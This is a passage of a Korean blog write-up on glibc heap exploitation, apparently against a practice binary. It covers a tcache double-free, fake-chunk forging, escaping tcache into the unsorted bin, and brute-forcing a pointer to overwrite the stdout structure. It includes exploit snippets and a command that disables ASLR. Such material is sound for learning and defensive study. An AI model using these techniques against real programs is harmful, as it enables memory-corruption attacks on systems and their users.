0x555555757270)</li>\n<li>두 번 할당시 해당 영역에 할당 가능하다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAxUlEQVQY04XOS26DMBSFYdaR4Idiw7WNbfADMORWSpGM1P1vqBPUjtpI//TTOU15jfhh8Wud65Iw2jCERaei06bBKioUk3/W3M9CvGsx3mvm6eC94x3wTvHuP3bhtq7UWYK5rQuLn6xzTMJbdmFyFupti+l2ziy+qHTkcb19O97cJs/BC5dt3OVU+4QqpjEr7fpU+ocCIhSVvzEBPzVbVuvkj4JHKvux63lRM8qA0oQMZlVDgMGDcWDGXoMNLCNPTxY2YcZvSPE6JFhCjZkAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./6.png\"\n        title=\"./6.png\"\n        src=\"/static/e6dfc16b39d3dfac66363bbec59aee3d/37523/6.png\"\n        srcset=\"/static/e6dfc16b39d3dfac66363bbec59aee3d/e9ff0/6.png 180w,\n/static/e6dfc16b39d3dfac66363bbec59aee3d/f21e7/6.png 360w,\n/static/e6dfc16b39d3dfac66363bbec59aee3d/37523/6.png 720w,\n/static/e6dfc16b39d3dfac66363bbec59aee3d/914ae/6.png 860w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>FD를 Fake Chunk의 주소 값으로 조작하여 첫 번째 tcache가 Fake chunk의 주소 값을 가리키는 것을 확인할 수 있다.</li>\n<li>두 번 할당시 해당 영역에 할당 가능하다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">fake</span> <span class=\"token expression\">chunk</span></span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xd1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n# <span class=\"token number\">0xd1</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> Fake chunk\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"BBBB\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 582px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 75.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAAsTAAALEwEAmpwYAAACoElEQVQoz3XS21LTQBzHcR5EaaENthUQWui5kNL0kGOz2d1kTzk3oYEqdbzyBZzRCx/FGd/QqchoL3yAz/z3O789mHX6Wqt30+xPJkZ7cGu6RLUdFaDRdH7cOD2qn172h+ed3ul157zTq122jipvJKleqtZK1dqBptn4Y+5//US+bI11SPMMrxIQh3YgLm5GlWYTRiG9z2me8fW94dNyvXFYefMHA8iS75+3P75++PkNfyrCMAuTnIqEifiy2Tmqn/GHdbx9ip826faJFNnx2dnh8Qs2ALagt7DheG5MEIi278WmYA/3dJ217uRq+xqJgCUrFidilZsQlyonz3KHFyYwAdYteDfTBrICuQ88ZkCsLcF5q10+aeg2clwOXAqJUE279PLmHdYBNh1XNYGyMGVFpUGMWYCoQB5/1+yUpbcO4Z6IPBHSILagW5ZqfzGiPhExJEK30VSzVg+bOC/S4jEtNlfdYVlq8GiVrDfxfbEq3nsi2MO6jZaImo47Vc2byZyGiSdC4sfEjy+uu6VqzSGchQkNIh6lNvb28HRhqIY9Xejjud6/nTjecx53XNZs96XGu7lhGwAbAFnQU1Rjr9kYytZQnsqKZiN5riIe2C4DRFguuVEW3dF4IE8GstIbjXujcas7LFf/uQxZ4PkJjzMbU31mPqRF6PkccQZo97r/ulrzkzzKCiJil0cW9I5PGoeVF6xajgnwEpGpbvnKciuyAgc58h9hoHZuX0k1GxPMA0gF5oEB0F7zwgS7JMe9WxjyeMZ5SInPWMho0LzqlqS64biOxx2PISq0pbOHLUhstPsAmuXczjSeZF4Q0yilUXrR7pVPGpgHPFqxMBFJBlyyh+HvnVmYmo6rqOaq2O2crB/T9eNVb1CWGixK/7fzL2d//jmqFT1mAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./6_1.png\"\n        title=\"./6_1.png\"\n        src=\"/static/dd7f3d4fe9a351c9cbf22ca5c2c9a96c/7c1cd/6_1.png\"\n        srcset=\"/static/dd7f3d4fe9a351c9cbf22ca5c2c9a96c/e9ff0/6_1.png 180w,\n/static/dd7f3d4fe9a351c9cbf22ca5c2c9a96c/f21e7/6_1.png 360w,\n/static/dd7f3d4fe9a351c9cbf22ca5c2c9a96c/7c1cd/6_1.png 582w\"\n        sizes=\"(max-width: 582px) 100vw, 582px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>포인터 배열 6번째 인덱스에 Fake chunk가 할당된 모습을 확인할 수 있다.</li>\n<li>해제를 세 번 한 이유는 <code class=\"language-text\">tcache->counts</code> 가 underflow 되는 것을 막기 위해서이다.</li>\n<li>free시 tcache→counts++</li>\n<li>malloc시 tcache→counts—</li>\n<li>만약 할당 과정에서 두 개의 tcache를 사용하게 된다면 다음 할당 과정에서 음수 처리가 되지 않기 때문에  255 변환되어 underflow되어 tcache를 사용하지 않는다.</li>\n<li>tcache는 7개 bin만을 관리하기 때문이다.</li>\n</ul>\n<h2 id=\"free-fake-chunk\" style=\"position:relative;\"><a href=\"#free-fake-chunk\" aria-label=\"free fake chunk permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Free Fake chunk</h2>\n<ul>\n<li><code class=\"language-text\">0xd0</code> 크기 또한 tcache에서 관리하기 때문에 unsorted bin이 되지 못한다.</li>\n<li>해당 청크를 8번 해제하면 마지막 해제할 때 unsorted bin이 되어 tcache escape가 가능하다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">fake</span> <span class=\"token expression\">chunk</span></span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xd1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n# <span class=\"token number\">0xd1</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> Fake chunk\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"BBBB\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">escape</span> <span class=\"token expression\">tcache</span></span>\n<span class=\"token keyword\">for</span> i in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">unsorted</span> <span class=\"token expression\">bin <span class=\"token operator\">&lt;</span><span class=\"token operator\">-</span> escape <span class=\"token function\">tcache</span> <span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">pause</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 66.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAABsElEQVQoz4WS63KaUBRGfY5UPIggh5tCVBANYgSpyP16uIka0/b936CTZNpMzVRn1r89a749394d2RRVbTT35+JGFpVHToQThZ0oDC/CHgnBTToPWwXj+Qdz1l0tcHYJyCG453zKmKH0eL5rypi+wNkFIKmPQW/wxh25u5YBJ3zbzDBtgXNPYMiCIQMoSECmT79vPqA/uZJxSA8pYcaqU04fyAYrr9XV43Q6UJckw1H9AcRpDkAB0AKgOfxKdk1l+/zkumaW73coslaGxo8NVbU0TZcXE8iRoxmYafhk2ZfmBMX8I3tBFiTF2nLi4pCgxnJDkpfcGCVV66cFxY2xPgWID6677HgJCtJivbXzpkXN0fYiKEhBVtSnS141kB9jBA1I5p0vhXlx7sdIN+28bov2vPffZD8tqtMlb1paEDHiv8freEnuJ+h5a2d125x/RHn5J/kVNScoSLdkN8q8ONfNXVYdyvbFCROal4IUVccLalp4O9lPyzArN9a+PJ4Pl59BmkNBilF9fP1Vny53ku2t7bqhqhuWGzhRauwcih1vvjtOmOy8kOJGvS+/8Vf+DWsfmow9E01cAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./7.png\"\n        title=\"./7.png\"\n        src=\"/static/4888cd178a7732d198d147e63ff153e5/37523/7.png\"\n        srcset=\"/static/4888cd178a7732d198d147e63ff153e5/e9ff0/7.png 180w,\n/static/4888cd178a7732d198d147e63ff153e5/f21e7/7.png 360w,\n/static/4888cd178a7732d198d147e63ff153e5/37523/7.png 720w,\n/static/4888cd178a7732d198d147e63ff153e5/59822/7.png 916w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">0x555555757260</code> Fake Chunk 부분을 8번 해제하여 마지막 한 부분이 unsortedbin 값에 대입된다.</li>\n<li>unsorted bin으로 넘어가는 부분에서 FD, BK 위치에 main_arena 주소가 담겨 있는 것을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"point-to-stdout\" style=\"position:relative;\"><a href=\"#point-to-stdout\" aria-label=\"point to stdout permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>point to stdout</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 572px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAABrElEQVQoz03QW2+iQAAF4P6JfWig3grVNrbBWMERYQYYYATkMjAOghRdTdy2+/+fN12bdZPzck7yvZwbB5gBdAjE/jpDmESUsW1DeUV5NQNLsS8rMwAxQe4KuSuIyWisdO6HXWnUlUY3FlnHrAyzjR+lwLSTnEd044WxFyY6wkJPMmyP1W1alAkrY8om6kLsyz358Qu7YZLzKkpZkFCICd+1vGnzsq7aI4mS284AeUG1PxbbXVE127e9qptXTOKc1y3ldZyXlhfU++Px/XdzOO32Jz+MbzsDm4SH8+fP8/vh/HH69aEuDOEftvwoppso27hBrCOcspLv2pSVSVEixxd68tJyWd2yqimqpmzayxHfGLnBOitImGKyBqYdZQXldVJwymuI/R9CF0An21QZ2yZsm5e1ujCuGM+A+6r5wIR4tYpzw3Kn8+XcQADawLQn6kKZAW1pvYKlZliqDqXH5+vb9gzYUy1EWNUhgI6OsOH4lhdYfhAkFAfrBbRN23+ZasPxZDhWLuwbz58nYKyYU016ehF6ktiX7wYPYl8W+7LQu/9a/ta7wcMl/+M/zbiE+dy/phkAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./8.png\"\n        title=\"./8.png\"\n        src=\"/static/eaee5a88b2a3cb62c01f43e504f2c91c/a805e/8.png\"\n        srcset=\"/static/eaee5a88b2a3cb62c01f43e504f2c91c/e9ff0/8.png 180w,\n/static/eaee5a88b2a3cb62c01f43e504f2c91c/f21e7/8.png 360w,\n/static/eaee5a88b2a3cb62c01f43e504f2c91c/a805e/8.png 572w\"\n        sizes=\"(max-width: 572px) 100vw, 572px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>stdout 주소와 main_arena 영역의 주소는 가까우며 1.5byte brute-force를 통해 main_arena의 주소를 stdout 주소로 조작해야 한다.</li>\n<li>ASLR을 끈 후에 익스프로잇을 작성하자</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">sysctl <span class=\"token operator\">-</span>w kernel<span class=\"token punctuation\">.</span>randomize_va_space<span class=\"token operator\">=</span><span class=\"token number\">0</span></code></pre></div>\n<ul>\n<li>미리 할당한 청크를 Double Free해 unsorted bin 청크 위에 새로 할당하고 하위 바이트를 덮어써 stdout 주소로 조작 한다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">double</span> <span class=\"token expression\">free</span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">point</span> <span class=\"token expression\">to main_arena address of unsorted bin</span></span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x70\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">stdout</span> <span class=\"token expression\">brute force</span></span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x60\\x07\\xdd\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">pause</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABX0lEQVQoz43QW0/CMBjG8X0Nomtxa7u3HVvpJuDmNgVkDJHTFpGDIorh+38EM4ULE0/J/6I3v+R5q6m47sW+k4bc88Dhdp1zl1cpYPJ3WiVpVHxZ6QW6CHUDPvuPLLF+dY4a8iQNkBMiKhABTMsQKdPJlwc2rWMMm5Zm8BqzVM2OoHYh68pTXEpm1yzDsAgBSsD8iBEwKEfgVsHBloN4vcqEliU8iuSw34yzlt3ogp9JFaS9/k2373GnxYRiwmPCpmBQURpwMThIqBLneT6azib3xerlNUmHshXPFo93+dxyPUzApNyg3KQcH2azz8GH2aNimY3ydDhdPG7b6cC/uFw/74qHFbPlqcHw8ebvP2w6X96O8+G02Oz2N4M7P4ifXveLpy04Sv/AP3XGhDYpHm7HRTaebXb73mCkmuF6+zZfb/6FO1E7uepetnvhdbcRJq7fijv9IOmYYCPT+h2/A9VTbYknm/zyAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./9.png\"\n        title=\"./9.png\"\n        src=\"/static/77760310dd7914b3f7438543febc9f5a/37523/9.png\"\n        srcset=\"/static/77760310dd7914b3f7438543febc9f5a/e9ff0/9.png 180w,\n/static/77760310dd7914b3f7438543febc9f5a/f21e7/9.png 360w,\n/static/77760310dd7914b3f7438543febc9f5a/37523/9.png 720w,\n/static/77760310dd7914b3f7438543febc9f5a/302a4/9.png 1080w,\n/static/77760310dd7914b3f7438543febc9f5a/dc61a/9.png 1147w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Double Free Bug를 바탕으로 같은 주소를 가리키게 한 다음 해당 크기 만큼 동적할 당하여 FD 값을 <code class=\"language-text\">\\x70</code> 바이트로 변조하여 Fake Chunk를 가리키게 한다.</li>\n<li>다음 할당은 버리고 Fake Chunk에 값을 써 하위 3바이트 부분을 stdout 주소로 변조한다.</li>\n<li>그럼이제 stdout을 조작할 준비가 끝났다.</li>\n</ul>\n<h2 id=\"overwrite-stdout-struct\" style=\"position:relative;\"><a href=\"#overwrite-stdout-struct\" aria-label=\"overwrite stdout struct permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overwrite Stdout Struct</h2>\n<ul>\n<li>Double Free Bug를 통해 조작한 stdout 주소가 존재하는 위치에 힙 청크를 할당 한다.</li>\n<li>할당하게 되면 FD가 stdout 주소가 되기 때문에 다음 할당 시 stdout 구조체에 할당이 되어 해당 구조체에 값을 쓸 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">double</span> <span class=\"token expression\">free bug</span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x70\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x60\"</span><span class=\"token punctuation\">)</span> # <span class=\"token constant\">stdout</span> <span class=\"token number\">1</span> byte \\x60\n<span class=\"token function\">pause</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAABCklEQVQY032NyW6DMBRF+Y4IbPCEHx6obYhNAkkhbapKWTWLpJv+/2dUnRZV1UhncRf36GTjbKfJjqdtt0S/cU0rQ2p8BB+BCImoxOxfsvwYkVH5HPI5knZf8roS8osb2o/8EJHW+bIu5gHrHWY1Zh/B281vuXiMSKvVocsPCetdTmRBATEouSz5ryv6M7KVsURY1vZgJ2oXcGsTWttS7YQJoqB1QWvEZMkkYbLkUH1SMsAcso0Hq/Xk0i6krm+jC31IrY1emglMBDNIPYgmCgAmJRWKcEO4IrwCm10v5n4xpxdzvqh07vHwTMc3Ol59tz3v59fD8Slu17Xqa2U4UOORS9gN+C4S0bwDhvZGszDf0eIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./10.png\"\n        title=\"./10.png\"\n        src=\"/static/f210e0c184e41d303510650668f2cd66/37523/10.png\"\n        srcset=\"/static/f210e0c184e41d303510650668f2cd66/e9ff0/10.png 180w,\n/static/f210e0c184e41d303510650668f2cd66/f21e7/10.png 360w,\n/static/f210e0c184e41d303510650668f2cd66/37523/10.png 720w,\n/static/f210e0c184e41d303510650668f2cd66/35751/10.png 873w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>이제 stdout 구조체를 영역을 할당하여 값을 조작하도록 한다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 513px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 101.66666666666666%; position: relative; bottom: 0; left: 0; background-image: 